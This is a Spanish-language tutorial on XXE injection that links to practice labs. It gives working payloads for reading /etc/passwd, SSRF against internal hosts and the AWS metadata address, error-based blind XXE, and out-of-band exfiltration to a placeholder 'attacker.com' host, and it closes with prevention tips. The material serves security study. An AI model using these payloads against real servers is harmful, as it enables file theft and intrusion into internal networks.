# XML External Entity Injection

## 🔧 Qué es una vulnerabilidad XXE

Una **XXE injection** es una vulnerabilidad de seguridad web que ocurre cuando una aplicación procesa datos XML de forma insegura. Esto permite a un atacante:

* Leer archivos arbitrarios del servidor (como `/etc/passwd`).
* Realizar ataques SSRF.
* Exfiltrar datos de forma encubierta (blind XXE).

La causa principal es que muchos parsers XML soportan por defecto funcionalidades peligrosas como las **entidades externas**, sin requerir que la aplicación las use intencionalmente.

---

## 🤖 Qué son las entidades externas en XML

XML permite definir **entidades externas** en la sección `DOCTYPE`, que pueden cargar contenido desde archivos locales o URLs externas. Ejemplo:

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```

Esta entidad `xxe` representará el contenido del archivo `/etc/passwd`, si el parser lo permite. Luego, podrá utilizarse en cualquier parte del XML como `&xxe;`.

---

## 🤷‍♂️ Por qué surgen las vulnerabilidades XXE

* Muchas aplicaciones utilizan XML para transmitir datos entre cliente y servidor (por ejemplo, en APIs SOAP o sistemas legados).
* Usan bibliotecas como `libxml`, `XMLParser`, etc. que admiten entidades externas por defecto.
* Si la configuración no desactiva esas funcionalidades, un atacante podrá aprovecharlas para manipular la forma en que se procesan los datos.

---

## 📊 Tipos de ataques XXE

### 1. ✅ **Lectura de archivos locales**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
  <productId>&xxe;</productId>
</stockCheck>
```

Esto causará que el contenido de `/etc/passwd` se inserte en el lugar de `&xxe;` y sea devuelto en la respuesta si se incluye.

### 2. 📡 **SSRF)**

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.service.local/admin"> ]>
```

Esto puede ser usado para escanear servicios internos o atacar metadata APIs (ej. `http://169.254.169.254` en AWS).

### 3. 🔒 **Blind XXE con exfiltración OOB (Out-of-band)**

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://attacker.com/exfil?data=file:///etc/passwd"> ]>
```

El servidor hace la solicitud, filtrando información al dominio del atacante.

### 4. 💡 **Blind XXE por error**

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
  <productId>&xxe;&invalid;</productId>
</stockCheck>
```

Puede generar errores que revelen partes del contenido si el parser no puede manejar el resultado.

---

## 🔢 Detección sistemática de XXE

En escenarios reales, el XML puede tener varios nodos. El atacante debe probar su entidad `&xxe;` en cada nodo individual y observar en cuál se refleja su valor. Por ejemplo:

```xml
<order>
  <client>&xxe;</client>
  <productId>42</productId>
  <comments>Urgente</comments>
</order>
```

---

[Lab: Exploiting XXE using external entities to retrieve files](1_Exploiting_XXE_using_external_entities_to_retrieve_files.md)  

![Practitioner](https://img.shields.io/badge/level-Apprentice-green) 

---

## XXE como vector de SSRF

Una de las implicancias más críticas de una vulnerabilidad XXE es la posibilidad de convertirla en un ataque de tipo **SSRF**. Este tipo de ataque permite forzar al servidor a realizar solicitudes HTTP (u otros protocolos) hacia recursos internos o externos sin autorización del atacante, utilizando la funcionalidad de análisis XML como canal.

### ¿Cómo se explota una XXE para realizar un SSRF?

Para explotar una XXE como un SSRF, el atacante define una entidad externa que apunta a una URL, como por ejemplo:

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/">
]>
```

Luego, se utiliza la entidad `&xxe;` dentro de un campo del XML que sea procesado por el servidor:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://192.168.0.68/admin">
]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

Si la respuesta del servidor refleja el contenido recibido desde esa URL, se tratará de un SSRF **bidireccional**, ya que el atacante puede ver la respuesta del sistema interno en la respuesta del servidor. Si no hay reflejo de la respuesta pero el servidor realiza la petición, se tratará de un SSRF **ciego (blind SSRF)**.

### Ejemplos de objetivos posibles

* Servicios internos accesibles sólo desde la red local del servidor, como:

  * `http://localhost/admin`
  * `http://127.0.0.1:8080/`
  * `http://192.168.0.1:8000/internal`

* Endpoints REST sin autenticación que operan dentro del mismo entorno, como paneles administrativos o APIs de backend.

* Servicios en otros protocolos si el parser XML lo permite (como FTP, Gopher, etc.).

### Impacto de un XXE-SSRF

* Acceso a funcionalidades internas no expuestas públicamente.
* Bypass de controles de acceso basados en IP (por ejemplo, firewalls lógicos).
* Enumeración de puertos y servicios internos.
* Potencial escalada de privilegios o comprometer más sistemas en la red interna.

### Ejemplo práctico

Supongamos que en una aplicación vulnerable se puede subir una consulta XML al servidor, y el servidor analiza el contenido para devolver información de stock. El siguiente payload podría usarse para verificar si el servidor puede acceder a un panel interno:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [
  <!ENTITY xxe SYSTEM "http://localhost:8080/admin">
]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

Si el servidor devuelve una respuesta con contenido HTML correspondiente a un panel de administración, entonces el ataque fue exitoso.

### Prevención

* Desactivar la resolución de entidades externas en los parsers XML.
* Usar librerías modernas que no permitan funcionalidades peligrosas por defecto.
* Aplicar listas blancas de destinos accesibles para el servidor.
* Revisar todos los servicios que procesan archivos XML.

---

Esta técnica XXE->SSRF es una de las combinaciones más peligrosas en ambientes empresariales, ya que permite a un atacante pivotear desde una vulnerabilidad aparentemente simple hasta acceder a infraestructura crítica.

---

[Lab: Exploiting XXE to perform SSRF attacks](2_Exploiting_XXE_to_perform_SSRF_attacks.md)  

![Practitioner](https://img.shields.io/badge/level-Apprentice-green) 

---

